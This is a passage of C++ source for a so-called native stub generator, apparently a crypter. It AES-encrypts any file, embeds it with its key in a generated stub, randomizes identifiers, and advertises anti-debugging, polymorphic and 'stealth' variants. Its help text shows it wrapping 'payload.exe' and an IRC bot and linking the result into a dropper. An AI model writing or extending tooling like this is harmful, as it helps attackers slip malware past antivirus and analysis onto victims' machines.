            for (size_t i = 0; i < keyLen; ++i) {
                key[i] = encKey[i];
            }
        }
        // Prepare AES key (expand or truncate to 16 bytes)
        uint8_t aesKey[16];
        for (size_t i = 0; i < 16; ++i) {
            aesKey[i] = key[i % keyLen];
        }
        // Encrypt the data
        aesCtrCrypt(fileData.data(), fileData.size(), aesKey, nonce);
        // Convert to hex strings for stub
        std::string keyHex, nonceHex;
        for (int i = 0; i < 16; i++) {
            char hex[3];
            sprintf(hex, "%02x", aesKey[i]);
            keyHex += hex;
            sprintf(hex, "%02x", nonce[i]);
            nonceHex += hex;
        }
        // Generate stub template
        std::string stubTemplate = generateStubTemplate(stubType);
        // Always randomize variable names for all stub types
        std::string keyVar = "KEY_" + generateRandomString(8);
        std::string nonceVar = "NONCE_" + generateRandomString(8);
        // Replace key definition
        size_t pos = stubTemplate.find("{KEY_DEFINITION}");
        if (pos != std::string::npos) {
            std::string keyDef = "const std::string " + keyVar + " = \"" + keyHex + "\";";
            stubTemplate.replace(pos, 16, keyDef);
        }
        // Replace nonce definition
        pos = stubTemplate.find("{NONCE_DEFINITION}");
        if (pos != std::string::npos) {
            std::string nonceDef = "const std::string " + nonceVar + " = \"" + nonceHex + "\";";
            stubTemplate.replace(pos, 18, nonceDef);
        }
        // Replace embedded data
        pos = stubTemplate.find("{EMBEDDED_DATA}");
        if (pos != std::string::npos) {
            stubTemplate.replace(pos, 15, embedDataAsArray(fileData));
        }
        // Replace key variable
        pos = stubTemplate.find("{KEY_VAR}");
        while (pos != std::string::npos) {
            stubTemplate.replace(pos, 9, keyVar);
            pos = stubTemplate.find("{KEY_VAR}");
        }
        // Replace nonce variable
        pos = stubTemplate.find("{NONCE_VAR}");
        while (pos != std::string::npos) {
            stubTemplate.replace(pos, 11, nonceVar);
            pos = stubTemplate.find("{NONCE_VAR}");
        }
        // Write stub to output file
        std::ofstream outFile(outputFile);
        if (!outFile.is_open()) {
            std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
            return;
        }
        outFile << stubTemplate;
        outFile.close();
        std::cout << "\u2713 Stub generated successfully!" << std::endl;
        std::cout << "  Input file: " << inputFile << std::endl;
        std::cout << "  Output stub: " << outputFile << std::endl;
        std::cout << "  Stub type: " << stubType << std::endl;
        std::cout << "  Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "  Encrypted size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "  Key: " << keyHex << std::endl;
        std::cout << "  Nonce: " << nonceHex << std::endl;
    }
    
    void generateBatchStubs(const std::string& inputDir, const std::string& outputDir,
                           const std::string& stubType = "basic", bool useRandomKey = true) {
        // This would implement batch processing of multiple files
        std::cout << "Batch stub generation not yet implemented" << std::endl;
    }
    
    void showHelp() {
        std::cout << "=== Universal Native Stub Generator - Unlimited Stub Creation ===" << std::endl;
        std::cout << "=================================================================" << std::endl;
        std::cout << std::endl;
        std::cout << "Universal file support: Works with ANY file type (executables, documents, images, etc.)" << std::endl;
        std::cout << "Random key generation: Each stub uses unique random AES-128-CTR keys" << std::endl;
        std::cout << std::endl;
        std::cout << "Usage:" << std::endl;
        std::cout << "  ./native_stub_generator <input_file> <output_stub.cpp> [stub_type] [use_random_key]" << std::endl;
        std::cout << "  ./native_stub_generator --standalone <output_stub.cpp> [stub_type] [use_random_key]" << std::endl;
        std::cout << std::endl;
        std::cout << "Arguments:" << std::endl;
        std::cout << "  input_file      - ANY file to embed in stub (exe, pdf, jpg, etc.)" << std::endl;
        std::cout << "  output_stub.cpp - Generated C++ stub file" << std::endl;
        std::cout << "  stub_type       - Type of stub (basic, advanced, minimal) [default: basic]" << std::endl;
        std::cout << "  use_random_key  - Use random key (1) or env var (0) [default: 1]" << std::endl;
        std::cout << std::endl;
        std::cout << "Modes:" << std::endl;
        std::cout << "  --standalone    - Generate standalone stub (no input file required)" << std::endl;
        std::cout << "  normal          - Generate stub with embedded file" << std::endl;
        std::cout << std::endl;
        std::cout << "Stub Types:" << std::endl;
        std::cout << "  basic    - Standard stub with AES-128-CTR decryption" << std::endl;
        std::cout << "  advanced - Anti-debugging and polymorphic features" << std::endl;
        std::cout << "  minimal  - Smallest possible stub" << std::endl;
        std::cout << "  standalone_basic    - Standalone stub (no embedded data)" << std::endl;
        std::cout << "  standalone_advanced - Standalone with anti-debugging/polymorphism" << std::endl;
        std::cout << "  standalone_stealth  - Standalone with stealth features" << std::endl;
        std::cout << std::endl;
        std::cout << "Universal Examples:" << std::endl;
        std::cout << "  # Executables" << std::endl;
        std::cout << "  ./native_stub_generator calc.exe stub.cpp" << std::endl;
        std::cout << "  ./native_stub_generator mirc_bot.cpp bot_stub.cpp advanced" << std::endl;
        std::cout << "  ./native_stub_generator payload.exe stealth_stub.cpp" << std::endl;
        std::cout << std::endl;
        std::cout << "  # Documents & Media" << std::endl;
        std::cout << "  ./native_stub_generator document.pdf doc_stub.cpp" << std::endl;
        std::cout << "  ./native_stub_generator image.jpg img_stub.cpp" << std::endl;
        std::cout << "  ./native_stub_generator video.mp4 vid_stub.cpp" << std::endl;
        std::cout << std::endl;
        std::cout << "  # Scripts & Archives" << std::endl;
        std::cout << "  ./native_stub_generator script.py py_stub.cpp" << std::endl;
        std::cout << "  ./native_stub_generator archive.zip zip_stub.cpp" << std::endl;
        std::cout << std::endl;
        std::cout << "  # Standalone Stubs" << std::endl;
        std::cout << "  ./native_stub_generator --standalone standalone_stub.cpp" << std::endl;
        std::cout << "  ./native_stub_generator --standalone advanced_stub.cpp standalone_advanced" << std::endl;
        std::cout << "  ./native_stub_generator --standalone stealth_stub.cpp standalone_stealth" << std::endl;
        std::cout << std::endl;
        std::cout << "Integration with other tools:" << std::endl;
        std::cout << "  # Generate standalone stub, then link with any file" << std::endl;
        std::cout << "  ./native_stub_generator --standalone stub.cpp basic" << std::endl;
        std::cout << "  ./stub_linker stub.cpp any_file.exe dropper.cpp" << std::endl;
        std::cout << std::endl;
        std::cout << "  # Or generate stub with embedded file directly" << std::endl;
        std::cout << "  ./native_stub_generator any_file.exe embedded_stub.cpp" << std::endl;
        std::cout << std::endl;
    }
};

// AES S-box and constants
const uint8_t NativeStubGenerator::sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

const uint8_t NativeStubGenerator::inv_sbox[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
};

const uint8_t NativeStubGenerator::rcon[11] = {
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
};

int main(int argc, char* argv[]) {
    NativeStubGenerator generator;
    
    if (argc < 2) {
        generator.showHelp();
        return 1;
    }
    
    // Check for standalone mode
    if (std::string(argv[1]) == "--standalone") {
        if (argc < 3 || argc > 5) {
            generator.showHelp();
            return 1;
        }
        
        std::string outputFile = argv[2];
        std::string stubType = (argc > 3) ? argv[3] : "basic";
        bool useRandomKey = (argc > 4) ? (std::string(argv[4]) == "1") : true;
        
        generator.generateStandaloneStub(outputFile, stubType, useRandomKey);
    } else {
        // Normal mode with input file
        if (argc < 3 || argc > 5) {
            generator.showHelp();
            return 1;
        }
        
        std::string inputFile = argv[1];
        std::string outputFile = argv[2];
        std::string stubType = (argc > 3) ? argv[3] : "basic";
        bool useRandomKey = (argc > 4) ? (std::string(argv[4]) == "1") : true;
        
        generator.generateStub(inputFile, outputFile, stubType, useRandomKey);
    }
    
    return 0;
}